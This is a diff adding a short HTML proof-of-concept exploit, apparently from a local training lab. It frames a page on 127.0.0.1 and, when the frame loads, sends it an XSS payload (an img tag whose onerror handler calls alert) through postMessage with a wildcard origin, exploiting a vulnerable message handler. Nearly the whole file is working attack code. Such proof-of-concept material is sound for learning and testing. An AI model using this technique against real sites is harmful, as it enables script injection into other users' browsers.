@@ -1,0 +1,12 @@
+<html>
+<body>
+<iframe id="ifr" style="position: absolute;width:60%;height:90%;" src="http://127.0.0.1:5000/21-XSS.html" onload="Exploit()">
+</iframe>
+<script>
+    function Exploit() {
+        XSSpayload = "<img src onerror=alert(document.domain)>"
+        document.getElementById('ifr').contentWindow.postMessage(XSSpayload,'*');
+    }
+</script>
+</body>
+</html>
